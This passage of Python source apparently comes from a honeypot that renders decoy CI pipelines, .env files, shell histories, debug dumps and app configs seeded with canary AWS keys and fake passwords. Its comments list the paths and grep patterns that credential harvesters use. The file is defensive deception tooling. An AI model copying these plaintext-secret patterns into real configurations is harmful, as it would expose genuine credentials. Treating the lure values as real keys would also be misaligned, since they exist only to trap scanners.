        "      AWS_DEFAULT_REGION: us-east-1\n"
        "    ports:\n"
        "      - '8080:8080'\n"
    ).encode("utf-8")


def render_github_actions_workflow(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    deploy_password = _fake_db_password()
    return (
        "name: deploy\n"
        "\n"
        "on:\n"
        "  push:\n"
        "    branches: [main]\n"
        "  workflow_dispatch:\n"
        "\n"
        "jobs:\n"
        "  deploy:\n"
        "    runs-on: ubuntu-latest\n"
        "    env:\n"
        "      AWS_DEFAULT_REGION: us-east-1\n"
        f"      AWS_ACCESS_KEY_ID: {aws.get('awsAccessKeyId', '')}\n"
        f"      AWS_SECRET_ACCESS_KEY: {aws.get('awsSecretAccessKey', '')}\n"
        f"      AWS_SESSION_TOKEN: {aws.get('awsSessionToken', '')}\n"
        f"      DATABASE_URL: postgresql://ci_deploy:{deploy_password}@db.internal:5432/prod\n"
        "    steps:\n"
        "      - uses: actions/checkout@v4\n"
        "      - uses: actions/setup-node@v4\n"
        "        with:\n"
        "          node-version: '22'\n"
        "      - run: npm ci && npm run build\n"
        "      - run: aws s3 sync dist/ s3://internal-tools-prod --delete\n"
        "      - run: aws cloudfront create-invalidation --distribution-id E2INTERNAL --paths '/*'\n"
    ).encode("utf-8")


def render_gitlab_ci_yml(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    deploy_password = _fake_db_password()
    return (
        "stages:\n"
        "  - test\n"
        "  - build\n"
        "  - deploy\n"
        "\n"
        "variables:\n"
        "  AWS_DEFAULT_REGION: us-east-1\n"
        f"  AWS_ACCESS_KEY_ID: {aws.get('awsAccessKeyId', '')}\n"
        f"  AWS_SECRET_ACCESS_KEY: {aws.get('awsSecretAccessKey', '')}\n"
        f"  AWS_SESSION_TOKEN: {aws.get('awsSessionToken', '')}\n"
        f"  DATABASE_URL: postgresql://ci_deploy:{deploy_password}@db.internal:5432/prod\n"
        "\n"
        "build-image:\n"
        "  stage: build\n"
        "  image: docker:27\n"
        "  services:\n"
        "    - docker:27-dind\n"
        "  script:\n"
        "    - docker build -t registry.internal/tools:$CI_COMMIT_SHA .\n"
        "\n"
        "deploy-production:\n"
        "  stage: deploy\n"
        "  image: amazon/aws-cli:2.15.57\n"
        "  only:\n"
        "    - main\n"
        "  script:\n"
        "    - aws ecs update-service --cluster prod --service internal-tools --force-new-deployment\n"
    ).encode("utf-8")


def render_jenkinsfile(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    deploy_password = _fake_db_password()
    return (
        "pipeline {\n"
        "  agent any\n"
        "  environment {\n"
        "    AWS_DEFAULT_REGION = 'us-east-1'\n"
        f"    AWS_ACCESS_KEY_ID = '{aws.get('awsAccessKeyId', '')}'\n"
        f"    AWS_SECRET_ACCESS_KEY = '{aws.get('awsSecretAccessKey', '')}'\n"
        f"    AWS_SESSION_TOKEN = '{aws.get('awsSessionToken', '')}'\n"
        f"    DATABASE_URL = 'postgresql://ci_deploy:{deploy_password}@db.internal:5432/prod'\n"
        "  }\n"
        "  stages {\n"
        "    stage('Build') {\n"
        "      steps { sh 'npm ci && npm run build' }\n"
        "    }\n"
        "    stage('Deploy') {\n"
        "      when { branch 'main' }\n"
        "      steps { sh 'aws ecs update-service --cluster prod --service internal-tools --force-new-deployment' }\n"
        "    }\n"
        "  }\n"
        "}\n"
    ).encode("utf-8")


def render_bitbucket_pipelines_yml(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    deploy_password = _fake_db_password()
    return (
        "image: node:22\n"
        "\n"
        "pipelines:\n"
        "  branches:\n"
        "    main:\n"
        "      - step:\n"
        "          name: Build and deploy\n"
        "          caches:\n"
        "            - node\n"
        "          script:\n"
        "            - export AWS_DEFAULT_REGION=us-east-1\n"
        f"            - export AWS_ACCESS_KEY_ID={aws.get('awsAccessKeyId', '')}\n"
        f"            - export AWS_SECRET_ACCESS_KEY={aws.get('awsSecretAccessKey', '')}\n"
        f"            - export AWS_SESSION_TOKEN={aws.get('awsSessionToken', '')}\n"
        f"            - export DATABASE_URL=postgresql://ci_deploy:{deploy_password}@db.internal:5432/prod\n"
        "            - npm ci\n"
        "            - npm run build\n"
        "            - pipe: atlassian/aws-s3-deploy:1.6.0\n"
        "              variables:\n"
        "                S3_BUCKET: internal-tools-prod\n"
        "                LOCAL_PATH: dist\n"
    ).encode("utf-8")


def render_generic_ci_yml(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    deploy_password = _fake_db_password()
    return (
        "version: 1\n"
        "name: internal-tools-deploy\n"
        "environment:\n"
        "  AWS_DEFAULT_REGION: us-east-1\n"
        f"  AWS_ACCESS_KEY_ID: {aws.get('awsAccessKeyId', '')}\n"
        f"  AWS_SECRET_ACCESS_KEY: {aws.get('awsSecretAccessKey', '')}\n"
        f"  AWS_SESSION_TOKEN: {aws.get('awsSessionToken', '')}\n"
        f"  DATABASE_URL: postgresql://ci_deploy:{deploy_password}@db.internal:5432/prod\n"
        "steps:\n"
        "  - checkout\n"
        "  - run: npm ci && npm run build\n"
        "  - run: aws deploy push --application-name internal-tools --s3-location s3://internal-tools-deploy/app.zip\n"
    ).encode("utf-8")


def render_application_properties(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    db_password = _fake_db_password()
    return (
        "# Spring Boot production config\n"
        "spring.application.name=internal-tools\n"
        "server.port=8080\n"
        "\n"
        "spring.datasource.url=jdbc:postgresql://db.internal:5432/prod\n"
        "spring.datasource.username=prod_rw\n"
        f"spring.datasource.password={db_password}\n"
        "\n"
        f"aws.access.key.id={aws.get('awsAccessKeyId', '')}\n"
        f"aws.access.key.secret={aws.get('awsSecretAccessKey', '')}\n"
        f"aws.session.token={aws.get('awsSessionToken', '')}\n"
        "aws.region=us-east-1\n"
    ).encode("utf-8")


def render_application_yml(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    db_password = _fake_db_password()
    return (
        "spring:\n"
        "  application:\n"
        "    name: internal-tools\n"
        "  datasource:\n"
        "    url: jdbc:postgresql://db.internal:5432/prod\n"
        "    username: prod_rw\n"
        f"    password: {db_password}\n"
        "aws:\n"
        f"  access-key-id: {aws.get('awsAccessKeyId', '')}\n"
        f"  access-key-secret: {aws.get('awsSecretAccessKey', '')}\n"
        f"  session-token: {aws.get('awsSessionToken', '')}\n"
        "  region: us-east-1\n"
    ).encode("utf-8")


def render_env_production(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    # Password is URL-safe already (secrets.token_urlsafe emits only
    # `-`, `_`, alphanum) so no extra percent-encoding is needed for the
    # userinfo component of DATABASE_URL.
    db_password = _fake_db_password()
    return (
        "# production .env — rotate quarterly (INFRA-218)\n"
        "NODE_ENV=production\n"
        f"AWS_ACCESS_KEY_ID={aws.get('awsAccessKeyId', '')}\n"
        f"AWS_SECRET_ACCESS_KEY={aws.get('awsSecretAccessKey', '')}\n"
        f"AWS_SESSION_TOKEN={aws.get('awsSessionToken', '')}\n"
        "AWS_REGION=us-east-1\n"
        f"DATABASE_URL=postgresql://prod_rw:{db_password}@db.internal:5432/prod\n"
    ).encode("utf-8")


def _fake_mail_api_key(service: str) -> str:
    if service == "sendgrid":
        return f"SG.{secrets.token_urlsafe(22)}.{secrets.token_urlsafe(43)}"
    if service == "postmark":
        return f"{secrets.token_hex(16)}-{secrets.token_hex(16)}"
    if service == "mailjet":
        return secrets.token_hex(16)
    if service == "brevo":
        return f"xkeysib-{secrets.token_hex(32)}-{secrets.token_urlsafe(16)}"
    if service == "mailgun":
        return f"key-{secrets.token_hex(16)}"
    return secrets.token_urlsafe(32)


_MAIL_SERVICE_PATH_MAP: dict[str, tuple[str, str, str, str]] = {
    "/sendgrid/.env":  ("sendgrid",  "SENDGRID_API_KEY",        "smtp.sendgrid.net",  "apikey"),
    "/postmark/.env":  ("postmark",  "POSTMARK_SERVER_TOKEN",   "smtp.postmarkapp.com", ""),
    "/mailjet/.env":   ("mailjet",   "MJ_APIKEY_PUBLIC",        "in-v3.mailjet.com",  ""),
    "/brevo/.env":     ("brevo",     "BREVO_API_KEY",           "smtp-relay.brevo.com", ""),
    "/mailgun/.env":   ("mailgun",   "MAILGUN_API_KEY",         "smtp.mailgun.org",   ""),
    "/mailing/.env":   ("sendgrid",  "SENDGRID_API_KEY",        "smtp.sendgrid.net",  "apikey"),
    "/mail/.env":      ("sendgrid",  "SENDGRID_API_KEY",        "smtp.sendgrid.net",  "apikey"),
    "/mailserver/.env": ("postmark", "POSTMARK_SERVER_TOKEN",   "smtp.postmarkapp.com", ""),
}


def _render_mail_service_env_for(path: str) -> "Callable[[dict[str, object]], bytes]":
    def _render(r: dict[str, object]) -> bytes:
        return render_mail_service_env(r, path=path)
    return _render


def render_mail_service_env(r: dict[str, object], *, path: str = "") -> bytes:
    svc, key_name, smtp_host, smtp_user = _MAIL_SERVICE_PATH_MAP.get(
        path.lower(), ("sendgrid", "SENDGRID_API_KEY", "smtp.sendgrid.net", "apikey"),
    )
    aws = _aws(r)
    api_key = _fake_mail_api_key(svc)
    db_password = _fake_db_password()
    smtp_password = _fake_mail_api_key(svc)
    lines = [
        f"# {svc} mailer config — do not commit (INFRA-314)",
        "NODE_ENV=production",
        "",
        f"# {svc.title()} credentials",
        f"{key_name}={api_key}",
    ]
    if svc == "mailjet":
        lines.append(f"MJ_APIKEY_PRIVATE={secrets.token_hex(16)}")
    if svc == "mailgun":
        lines.append(f"MAILGUN_DOMAIN=mg.internal-apps.com")
    lines += [
        "",
        f"SMTP_HOST={smtp_host}",
        "SMTP_PORT=587",
    ]
    if smtp_user:
        lines.append(f"SMTP_USER={smtp_user}")
    lines.append(f"SMTP_PASSWORD={smtp_password}")
    lines += [
        "",
        "# AWS (S3 attachments + SES fallback)",
        f"AWS_ACCESS_KEY_ID={aws.get('awsAccessKeyId', '')}",
        f"AWS_SECRET_ACCESS_KEY={aws.get('awsSecretAccessKey', '')}",
        f"AWS_SESSION_TOKEN={aws.get('awsSessionToken', '')}",
        "AWS_REGION=us-east-1",
        "S3_BUCKET=prod-mail-attachments",
        "",
        f"DATABASE_URL=postgresql://mailer_rw:{db_password}@db.internal:5432/mailer_prod",
        "",
    ]
    return "\n".join(lines).encode("utf-8")


def render_bash_history(r: dict[str, object]) -> bytes:
    # Synthetic `~/.bash_history` — the goal is to look like a real
    # operator's recent session captured by sloppy shell history settings
    # (`HISTFILE` left on, no `set +o history` around credential paste).
    # Scanners that harvest this file run grep over it for
    # `AWS_ACCESS_KEY_ID`, `password`, `export `, `ssh -i`, `curl -H`, etc.
    # The canary AWS triple lives in a plausible "credential-paste"
    # cluster; the surrounding lines are realistic noise. Per-hit-unique
    # bits (db password, commit SHA, PR number, port number, fake S3 key
    # path) keep the rendered body from acting as a fleet-wide
    # fingerprint.
    aws = _aws(r)
    db_password = _fake_db_password()
    short_sha = secrets.token_hex(4)
    pr_number = secrets.randbelow(900) + 100
    ssh_jump_port = 30000 + secrets.randbelow(5000)
    rand_uploads_key = secrets.token_hex(8)
    lines = [
        "cd /var/www/app",
        "git pull",
        "git status",
        "ls -la",
        "vim app/config/settings.py",
        f"git checkout -b hotfix/INFRA-{pr_number}",
        "git diff",
        "git add -p",
        f'git commit -m "hotfix: rotate s3 uploader creds (INFRA-{pr_number})"',
        "git push origin HEAD",
        "docker compose ps",
        "docker compose logs -f web | tail -200",
        "docker compose restart web",
        "df -h",
        "free -m",
        "htop",
        "sudo systemctl status nginx",
        "sudo tail -n 200 /var/log/nginx/access.log",
        "ssh deploy@app-prod-01.internal -p 22",
        f"ssh -i ~/.ssh/id_ed25519 -p {ssh_jump_port} deploy@bastion.internal",
        "scp dump.sql.gz deploy@app-prod-01.internal:/tmp/",
        f"psql -U prod_rw -h db.internal -d prod -c 'select count(*) from users;'",
        f"PGPASSWORD='{db_password}' psql -U prod_rw -h db.internal -d prod",
        f'mysql -uroot -p"{db_password}" -h db.internal prod -e "show tables;"',
        "redis-cli -h cache.internal ping",
        "kubectl get pods -n prod",
        "kubectl logs -n prod deploy/web --tail=200",
        "kubectl exec -it -n prod deploy/web -- /bin/sh",
        "# ---- rotating uploader creds, paste from 1pw ----",
        f"export AWS_ACCESS_KEY_ID={aws.get('awsAccessKeyId', '')}",
        f"export AWS_SECRET_ACCESS_KEY={aws.get('awsSecretAccessKey', '')}",
        f"export AWS_SESSION_TOKEN={aws.get('awsSessionToken', '')}",
        "export AWS_DEFAULT_REGION=us-east-1",
        "aws sts get-caller-identity",
        "aws s3 ls",
        "aws s3 ls s3://prod-uploads/",
        f"aws s3 cp s3://prod-uploads/{rand_uploads_key}.tar.gz /tmp/",
        f"tar -xzf /tmp/{rand_uploads_key}.tar.gz -C /tmp/restore/",
        "aws s3 cp /tmp/restore/manifest.json s3://prod-uploads/manifests/",
        f"aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 123456789012.dkr.ecr.us-east-1.amazonaws.com",
        "history -c",
        "clear",
        "exit",
        "ls",
        "cat README.md",
        f"git log --oneline -n 20 | head -3   # tip {short_sha}",
        "make deploy",
        "make logs",
        "uptime",
        "who",
        "exit",
    ]
    return ("\n".join(lines) + "\n").encode("utf-8")


def render_zsh_history(r: dict[str, object]) -> bytes:
    # zsh extended-history line shape is ``: <unix_ts>:<elapsed>;<cmd>``
    # with `setopt EXTENDED_HISTORY`. Scanners harvesting `.zsh_history`
    # parse with the same grep patterns as `.bash_history`, but the
    # timestamp prefix is a useful "scanner saw a real zsh history" tell
    # for whoever's reading our trap logs. Same canary placement;
    # per-hit-unique timestamps and elapsed times.
    aws = _aws(r)
    db_password = _fake_db_password()
    # Anchor the timestamps within the last ~2 days, in increasing order
    # (the way EXTENDED_HISTORY actually writes them). Real bash-history
    # files don't carry timestamps unless HISTTIMEFORMAT is set; zsh's
    # native format makes for a useful sibling trap.
    base_ts = int(time.time()) - 86400 * 2 - secrets.randbelow(43200)
    plain_cmds = [
        "cd ~/code/app",
        "git status",
        "vim app/handlers.py",
        "yarn install",
        "yarn test --coverage",
        "git diff --stat",
        "ssh prod-01",
        "kubectl get pods -n prod",
        "aws sts get-caller-identity",
        "aws s3 ls s3://prod-uploads/",
        "aws s3 cp ./build.tar.gz s3://prod-uploads/builds/",
        f"PGPASSWORD='{db_password}' psql -U prod_rw -h db.internal -d prod",
        "history",
        "exit",
    ]
    out_lines: list[str] = []
    # Drop the canary export trio right before the `aws ...` commands so
    # the harvester's grep over `AWS_ACCESS_KEY_ID|export ` lights up.
    canary_trio = [
        f"export AWS_ACCESS_KEY_ID={aws.get('awsAccessKeyId', '')}",
        f"export AWS_SECRET_ACCESS_KEY={aws.get('awsSecretAccessKey', '')}",
        f"export AWS_SESSION_TOKEN={aws.get('awsSessionToken', '')}",
    ]
    sequence: list[str] = []
    inserted = False
    for cmd in plain_cmds:
        if not inserted and cmd.startswith("aws "):
            sequence.extend(canary_trio)
            inserted = True
        sequence.append(cmd)
    if not inserted:
        sequence.extend(canary_trio)
    ts = base_ts
    for cmd in sequence:
        elapsed = secrets.randbelow(8)
        out_lines.append(f": {ts}:{elapsed};{cmd}")
        ts += 1 + secrets.randbelow(120)
    return ("\n".join(out_lines) + "\n").encode("utf-8")


def render_env_vault(r: dict[str, object]) -> bytes:
    # `.env.vault` is the dotenv-vault file format: per-environment
    # encrypted ciphertext entries that need a `DOTENV_KEY` decryption
    # URL to be useful. A clean .env.vault is therefore *not* a
    # credential leak on its own — scanners harvesting these paths are
    # opportunistically grabbing the file in case the operator also
    # committed plaintext fallbacks or left a debug block at the
    # bottom (which happens often enough that the scanner pattern
    # exists).
    #
    # The renderer reproduces that misconfiguration shape: realistic
    # ciphertext entries plus a "REMOVE before merge" plaintext
    # AWS/DB block at the bottom carrying the per-request canary.
    # Per-hit unique ciphertext + DB password keep the response from
    # turning the fleet into a single fingerprint.
    aws = _aws(r)
    enc_dev = secrets.token_urlsafe(96)
    enc_staging = secrets.token_urlsafe(96)
    enc_prod = secrets.token_urlsafe(96)
    db_password = _fake_db_password()
    return (
        "#/-------------------.env.vault---------------------/\n"
        "#/         cloud-agnostic vaulting standard         /\n"
        "#/   [how it works](https://dotenv.org/env-vault)   /\n"
        "#/--------------------------------------------------/\n"
        "\n"
        "# development\n"
        f'DOTENV_VAULT_DEVELOPMENT="{enc_dev}"\n'
        "DOTENV_VAULT_DEVELOPMENT_VERSION=2\n"
        "\n"
        "# staging\n"
        f'DOTENV_VAULT_STAGING="{enc_staging}"\n'
        "DOTENV_VAULT_STAGING_VERSION=2\n"
        "\n"
        "# production\n"
        f'DOTENV_VAULT_PRODUCTION="{enc_prod}"\n'
        "DOTENV_VAULT_PRODUCTION_VERSION=5\n"
        "\n"
        "# accidentally committed plaintext fallback (REMOVE before merge):\n"
        f"AWS_ACCESS_KEY_ID={aws.get('awsAccessKeyId', '')}\n"
        f"AWS_SECRET_ACCESS_KEY={aws.get('awsSecretAccessKey', '')}\n"
        f"AWS_SESSION_TOKEN={aws.get('awsSessionToken', '')}\n"
        "AWS_REGION=us-east-1\n"
        f"DATABASE_URL=postgresql://prod_rw:{db_password}@db.internal:5432/prod\n"
    ).encode("utf-8")


def render_pprof_dump(r: dict[str, object]) -> bytes:
    # Go's `net/http/pprof` package serves debug/profiling endpoints
    # under `/debug/pprof/`. The most common scanner targets are
    # `/debug/pprof/` (HTML index), `/debug/pprof/heap` (memory
    # profile), `/debug/pprof/cmdline` (NUL-separated process args),
    # and `/debug/pprof/goroutine` (stack traces). Real Go output for
    # these is a mix of binary protobuf, NUL-separated text, and
    # plaintext — and harvesters that find an exposed pprof endpoint
    # grep raw bytes for `AKIA...` / `AWS_SECRET_ACCESS_KEY` rather
    # than parse pprof's protobuf, since the value is the same: a
    # process whose memory contains live cloud credentials.
    #
    # The renderer returns a plaintext heap-profile-shaped body that
    # leaks the canary AWS credentials in the same place a sloppy
    # service would: cmdline args + an embedded environment block.
    # `text/plain` content-type matches Go's `?debug=1` text output,
    # so a scanner reading the body gets the canary plainly.
    aws = _aws(r)
    db_password = _fake_db_password()
    return (
        "heap profile: 14: 6815744 [318: 23068672] @ heap/1048576\n"
        "1: 524288 [1: 524288] @ 0x4afba1 0x4ad04c 0x4abc41 0x4abdcb 0x47bb56\n"
        "#\t0x4afba0\tmain.loadAwsCredentials+0x80\t/build/cmd/server/main.go:142\n"
        "#\t0x4ad04b\tmain.main+0x21b\t/build/cmd/server/main.go:88\n"
        "\n"
        "# command line\n"
        "# /usr/local/bin/server -config=/etc/app/config.yaml\n"
        "\n"
        "# environment\n"
        f"# AWS_ACCESS_KEY_ID={aws.get('awsAccessKeyId', '')}\n"
        f"# AWS_SECRET_ACCESS_KEY={aws.get('awsSecretAccessKey', '')}\n"
        f"# AWS_SESSION_TOKEN={aws.get('awsSessionToken', '')}\n"
        "# AWS_REGION=us-east-1\n"
        f"# DATABASE_URL=postgresql://prod_rw:{db_password}@db.internal:5432/prod\n"
        "\n"
        "# runtime.MemStats\n"
        "# Alloc = 6815744\n"
        "# TotalAlloc = 23068672\n"
        "# Sys = 22020096\n"
        "# NumGC = 4\n"
    ).encode("utf-8")


def render_procfile(r: dict[str, object]) -> bytes:
    """Heroku `Procfile` — process declaration. Real Procfiles don't
    normally carry secrets, but a sloppy commit pattern is to inline
    env values into the start command (`web: AWS_ACCESS_KEY_ID=... gunicorn …`);
    leading comments also routinely carry stash-style config-var
    rotations. Both shapes carry the canary AWS triple."""
    aws = _aws(r)
    return (
        "# Production config-vars staged before promotion to Heroku:\n"
        f"#   AWS_ACCESS_KEY_ID={aws.get('awsAccessKeyId', '')}\n"
        f"#   AWS_SECRET_ACCESS_KEY={aws.get('awsSecretAccessKey', '')}\n"
        f"#   AWS_SESSION_TOKEN={aws.get('awsSessionToken', '')}\n"
        "#   AWS_REGION=us-east-1\n"
        "web: gunicorn app.wsgi --bind 0.0.0.0:$PORT --workers 3\n"
        "worker: celery -A app worker --loglevel=info\n"
        "release: alembic upgrade head\n"
        "scheduler: celery -A app beat --loglevel=info\n"
    ).encode("utf-8")


def render_heroku_yml(r: dict[str, object]) -> bytes:
    """Heroku `heroku.yml` — Heroku-build (container-stack) manifest.
    The `config:` blocks under `setup.config` and `build.config` carry
    real env values in many real deployments; the AWS canary triple
    lands there."""
    aws = _aws(r)
    return (
        "setup:\n"
        "  addons:\n"
        "    - plan: heroku-postgresql:standard-0\n"
        "    - plan: heroku-redis:premium-0\n"
        "  config:\n"
        "    AWS_REGION: us-east-1\n"
        f"    AWS_ACCESS_KEY_ID: {aws.get('awsAccessKeyId', '')}\n"
        f"    AWS_SECRET_ACCESS_KEY: {aws.get('awsSecretAccessKey', '')}\n"
        f"    AWS_SESSION_TOKEN: {aws.get('awsSessionToken', '')}\n"
        "build:\n"
        "  docker:\n"
        "    web: Dockerfile\n"
        "    worker: Dockerfile.worker\n"
        "  config:\n"
        f"    AWS_ACCESS_KEY_ID: {aws.get('awsAccessKeyId', '')}\n"
        f"    AWS_SECRET_ACCESS_KEY: {aws.get('awsSecretAccessKey', '')}\n"
        "    S3_BUCKET: prod-uploads\n"
        "run:\n"
        "  web: gunicorn app.wsgi\n"
        "  worker: celery -A app worker\n"
    ).encode("utf-8")


def render_heroku_app_json(r: dict[str, object]) -> bytes:
    """Heroku `app.json` — app metadata + buildpacks + env declaration.
    The `env.<NAME>.value` slot is the canonical place real deployments
    bake credentials when they don't want to use the Heroku UI for
    config-vars (review apps + Heroku-button deploys both surface this
    way)."""
    aws = _aws(r)
    return json.dumps({
        "name": "internal-tools",
        "description": "Internal tools deploy",
        "repository": "https://github.com/internal-tools/app",
        "keywords": ["python", "flask", "internal"],
        "addons": ["heroku-postgresql:standard-0", "heroku-redis:premium-0"],
        "buildpacks": [{"url": "heroku/python"}],
        "stack": "heroku-22",
        "env": {
            "AWS_ACCESS_KEY_ID": {
                "description": "S3 backup creds",
                "value": aws.get("awsAccessKeyId", ""),
            },
            "AWS_SECRET_ACCESS_KEY": {
                "description": "S3 backup creds",
                "value": aws.get("awsSecretAccessKey", ""),
                "required": True,
            },
            "AWS_SESSION_TOKEN": {
                "value": aws.get("awsSessionToken", ""),
            },
            "AWS_REGION": {"value": "us-east-1"},
            "DATABASE_URL": {"required": True},
            "SECRET_KEY_BASE": {"generator": "secret"},
        },
        "scripts": {"postdeploy": "alembic upgrade head"},
    }, indent=2).encode("utf-8")


def render_appsettings_json(r: dict[str, object]) -> bytes:
    """.NET Core `appsettings.json` — config + ConnectionStrings.
    The `ConnectionStrings.DefaultConnection` slot holds plaintext
    DB creds in many real deployments; the AWS canary lives in a
    flat `AWS` block at the root (a common ASP.NET Core convention
    when bridging to S3 via the AWS SDK for .NET)."""
    aws = _aws(r)
    db_pw = _fake_db_password()
    azure_key = base64.b64encode(secrets.token_bytes(64)).decode("ascii")
    return json.dumps({
        "Logging": {
            "LogLevel": {
                "Default": "Information",
                "Microsoft.AspNetCore": "Warning",
                "Microsoft.EntityFrameworkCore": "Warning",
            },
        },
        "AllowedHosts": "*",
        "ConnectionStrings": {
            "DefaultConnection": (
                f"Server=db.internal;Database=prod;User Id=appuser;"
                f"Password={db_pw};Trusted_Connection=False;MultipleActiveResultSets=true"
            ),
            "AzureBlobStorage": (
                f"DefaultEndpointsProtocol=https;AccountName=prodstorage;"
                f"AccountKey={azure_key};EndpointSuffix=core.windows.net"
            ),
        },
        "AWS": {
            "Region": "us-east-1",
            "AccessKey": aws.get("awsAccessKeyId", ""),
            "SecretKey": aws.get("awsSecretAccessKey", ""),
            "SessionToken": aws.get("awsSessionToken", ""),
            "BucketName": "prod-backups",
        },
        "Jwt": {
            "Issuer": "internal-tools",
            "Audience": "internal-tools",
            "Key": base64.b64encode(secrets.token_bytes(48)).decode("ascii"),
        },
    }, indent=2).encode("utf-8")


def render_iis_web_config(r: dict[str, object]) -> bytes:
    """IIS `web.config` — XML config carrying `connectionStrings` and
    `appSettings` for ASP.NET / ASP.NET Core hosts. The
    `<appSettings><add key="AWS_..." value="..."/>` block is where
    real deployments park S3 / SQS / SES credentials when the AWS SDK
    is configured via App.config."""
    aws = _aws(r)
    db_pw = _fake_db_password()
    machine_key = base64.b16encode(secrets.token_bytes(32)).decode("ascii")
    return (
        '<?xml version="1.0" encoding="utf-8"?>\n'
        '<configuration>\n'
        '  <connectionStrings>\n'
        f'    <add name="DefaultConnection" providerName="System.Data.SqlClient"\n'
        f'         connectionString="Server=db.internal;Database=prod;User Id=appuser;Password={db_pw};Trusted_Connection=False" />\n'
        '  </connectionStrings>\n'
        '  <appSettings>\n'
        f'    <add key="AWS_ACCESS_KEY_ID" value="{aws.get("awsAccessKeyId", "")}" />\n'
        f'    <add key="AWS_SECRET_ACCESS_KEY" value="{aws.get("awsSecretAccessKey", "")}" />\n'
        f'    <add key="AWS_SESSION_TOKEN" value="{aws.get("awsSessionToken", "")}" />\n'
        '    <add key="AWS_REGION" value="us-east-1" />\n'
        '    <add key="S3Bucket" value="prod-backups" />\n'
        '  </appSettings>\n'
        '  <system.web>\n'
        f'    <machineKey validationKey="{machine_key}" decryptionKey="{machine_key[:48]}"\n'
        '                validation="HMACSHA256" decryption="AES" />\n'
        '    <authentication mode="Forms" />\n'
        '  </system.web>\n'
        '  <system.webServer>\n'
        '    <handlers>\n'
        '      <add name="aspNetCore" path="*" verb="*" modules="AspNetCoreModuleV2"\n'
        '           resourceType="Unspecified" />\n'
        '    </handlers>\n'
        '    <aspNetCore processPath="dotnet" arguments=".\\app.dll"\n'
        '                stdoutLogEnabled="false" hostingModel="inprocess" />\n'
        '  </system.webServer>\n'
        '</configuration>\n'
    ).encode("utf-8")


def render_composer_auth_json(r: dict[str, object]) -> bytes:
    """PHP Composer `auth.json` — `http-basic`, `github-oauth`,
    `gitlab-token`, `bearer` credential blocks. Every credential
    field is the gitlab-username-password canary, so a replay
    against the canary's hosted gitlab URL fires the alert."""
    creds = _gitlab_creds(r, "gitlab-username-password").get("credentials") or {}
    if not isinstance(creds, dict):
        creds = {}
    username = str(creds.get("username", "") or "deploy")
    password = str(creds.get("password", "") or "")
    return json.dumps({
        "http-basic": {
            "gitlab.com": {"username": username, "password": password},
            "repo.packagist.com": {"username": "internal-tools", "password": password},
            "nexus.internal": {"username": "ci-deploy", "password": password},
        },
        "github-oauth": {"github.com": password},
        "gitlab-token": {"gitlab.com": password},
        "bearer": {"private-packagist.example.com": password},
    }, indent=2).encode("utf-8")


def render_dockerfile(r: dict[str, object]) -> bytes:
    """`Dockerfile` source — scanner targets it because half of all
    "creds-in-Dockerfile" leaks are `ENV AWS_ACCESS_KEY_ID=...` /
    `ARG AWS_SECRET_ACCESS_KEY=...` lines committed by accident.
    The canary lives in both an ARG default and an ENV assignment so
    the harvester that parses either form gets it."""
    aws = _aws(r)
    return (
        "FROM python:3.11-slim\n"
        "\n"
        "WORKDIR /app\n"
        "\n"
        "# Build-time AWS creds for the artifact pull. Move to runtime\n"
        "# config once the CD pipeline stops baking them in (INFRA-412).\n"
        f"ARG AWS_ACCESS_KEY_ID={aws.get('awsAccessKeyId', '')}\n"
        f"ARG AWS_SECRET_ACCESS_KEY={aws.get('awsSecretAccessKey', '')}\n"
        f"ENV AWS_ACCESS_KEY_ID=${{AWS_ACCESS_KEY_ID}}\n"
        f"ENV AWS_SECRET_ACCESS_KEY=${{AWS_SECRET_ACCESS_KEY}}\n"
        f"ENV AWS_SESSION_TOKEN={aws.get('awsSessionToken', '')}\n"
        "ENV AWS_REGION=us-east-1\n"
        "\n"
        "COPY requirements.txt .\n"
        "RUN pip install --no-cache-dir -r requirements.txt\n"
        "\n"
        "COPY . .\n"
        "\n"
        "EXPOSE 8000\n"
        'CMD ["gunicorn", "app.wsgi", "--bind", "0.0.0.0:8000"]\n'
    ).encode("utf-8")


def render_actuator_env_json(r: dict[str, object]) -> bytes:
    # Spring Boot Actuator `/env` response shape: activeProfiles + a list of
    # propertySources, each holding `properties: {<key>: {value, origin?}}`.
    # Unmasked values are the misconfiguration we're simulating — the
    # `management.endpoint.env.show-values=ALWAYS` flag (or an ancient 1.x
    # actuator with no masking) is what makes this endpoint a credential
    # leak in the wild. A scanner that reaches this path is expecting the
    # raw credential back; mask it and the response fails the scanner's
    # filter and they move on.
    aws = _aws(r)
    db_password = _fake_db_password()
    payload = {
        "activeProfiles": ["production"],
        "propertySources": [
            {
                "name": "server.ports",
                "properties": {
                    "local.server.port": {"value": 8080},
                },
            },
            {
                "name": "systemEnvironment",
                "properties": {
                    "AWS_ACCESS_KEY_ID": {
                        "value": aws.get("awsAccessKeyId", ""),
                        "origin": 'System Environment Property "AWS_ACCESS_KEY_ID"',
                    },
                    "AWS_SECRET_ACCESS_KEY": {
                        "value": aws.get("awsSecretAccessKey", ""),
                        "origin": 'System Environment Property "AWS_SECRET_ACCESS_KEY"',
                    },
                    "AWS_SESSION_TOKEN": {
                        "value": aws.get("awsSessionToken", ""),
                    },
                    "AWS_DEFAULT_REGION": {"value": "us-east-1"},
                    "JAVA_HOME": {"value": "/usr/lib/jvm/java-17-openjdk"},
                    "PATH": {
                        "value": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                    },
                },
            },
            {
                "name": "applicationConfig: [classpath:/application.yml]",
                "properties": {
                    "spring.application.name": {"value": "internal-tools"},
                    "spring.datasource.url": {
                        "value": "jdbc:postgresql://db.internal:5432/prod",
                    },
                    "spring.datasource.username": {"value": "prod_rw"},
                    "spring.datasource.password": {"value": db_password},
                    "spring.datasource.driver-class-name": {
                        "value": "org.postgresql.Driver",
                    },
                    "management.endpoints.web.exposure.include": {"value": "*"},
                },
            },
        ],
    }
    return json.dumps(payload, indent=2).encode("utf-8")


def render_actuator_heapdump(r: dict[str, object]) -> bytes:
    # Spring Boot Actuator `/heapdump` returns a binary HPROF (Java heap
    # profile) on a misconfigured app — the same format `jmap -dump:format=b`
